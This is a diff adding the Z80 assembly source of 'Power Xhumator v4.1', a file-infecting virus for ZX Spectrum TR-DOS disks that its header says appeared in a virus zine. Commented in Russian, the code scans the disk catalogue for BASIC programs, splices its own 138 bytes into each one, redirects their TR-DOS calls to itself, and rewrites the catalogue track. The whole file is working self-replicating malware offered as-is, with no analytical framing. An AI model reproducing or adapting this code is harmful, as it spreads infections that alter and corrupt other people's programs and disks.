@@ -1,0 +1,113 @@
+;published in Social Distortion #2
+;---------------------------
+;    Power Xhumator v4.1
+; Special edition  4 Zx-Net
+;
+;     Koded & Optimized
+;      by  !mPeR!0^PHG
+;---------------------------
+
+LEN     EQU     138
+
+        ORG     #8000
+
+        RST     56
+        EXX                  ;меняем регистры на альтренативные
+        DEC     SP
+        DEC     SP
+        POP     AF           ;получем адрес запуска вируса + 1
+        EX      AF,AF'
+        LD      HL,#C9F1     ;(*)
+        LD      (23746),HL   ;(*)
+        LD      DE,0         ;(*)
+        LD      BC,#0905
+        PUSH    HL
+        PUSH    HL
+        CALL    #3D13        ;чиатем 0 трек
+        EX      (SP),HL
+FIND    POP     AF           ;ищем жертву
+        LD      A,(HL)
+        POP     DE
+        AND     A
+        JR      Z,EXIT       ;жертв нет, диск можно убивать
+        PUSH    DE
+        LD      DE,4
+        ADD     HL,DE
+        ADD     HL,DE
+        LD      A,(HL)       ;тип файла
+        INC     HL
+        LD      C,(HL)       ;длина.Lo
+        PUSH    HL
+        INC     HL
+        LD      B,(HL)       ;длина.Hi
+        ADD     HL,DE
+        LD      E,(HL)       ;начальный сектор
+        INC     HL
+        LD      D,(HL)       ;начальный трек
+        INC     HL
+        CP      "B"
+        JR      NZ,FIND      ;то не basic
+        LD      A,C
+        CP      253-LEN
+        JR      NC,FIND      ;длины многовато будет
+        POP     HL
+        ADD     A,LEN        ;увеличиваем длину файла
+        LD      (HL),A       ;на длину вируса
+        LD      HL,#DD3B
+        PUSH    BC
+        PUSH    DE
+        PUSH    HL
+        PUSH    BC
+        PUSH    BC
+        PUSH    HL
+        INC     B
+        LD      C,5
+        CALL    #3D13        ;читаем файл
+        POP     HL
+        POP     BC
+        ADD     HL,BC
+        PUSH    HL
+        PUSH    HL
+        EX      DE,HL
+        LD      HL,LEN
+        PUSH    HL
+        ADD     HL,DE
+        EX      DE,HL
+        LDIR                 ;освобождаем место для вируса
+        POP     BC
+        POP     DE
+        EX      AF,AF'
+        PUSH    AF
+        POP     HL
+        DEC     HL
+        LDIR                 ;всовываем код вируса
+        POP     DE
+        POP     BC
+        LD      H,D
+        LD      L,E
+        RES     7,D
+        LD      A,#3D
+        CPDR                 ;ищем с конца файла #3D
+        ADD     A,(HL)
+        CP      #50
+        JR      NZ,SAVE      ;это не #3D13
+
+        LD      (HL),E       ;меняем #3D13 на адрес вируса
+        INC     HL
+        LD      (HL),D
+SAVE    POP     HL
+        POP     DE
+        POP     BC
+        INC     B
+        LD      C,6
+        CALL    #3D13        ;сохраняем файл на свое место
+EXIT    POP     HL
+        LD      DE,0         ;(*)
+        LD      BC,#0906
+        CALL    #3D13        ;сохраняем измененный нулевой трек
+
+        EXX                  ;восстанавливаем регистры
+
+        JP      #3D13        ;выполняем обращение к TR-DOS
+                             ;(то, которое должна была выполнить
+                             ;зараженная прога),
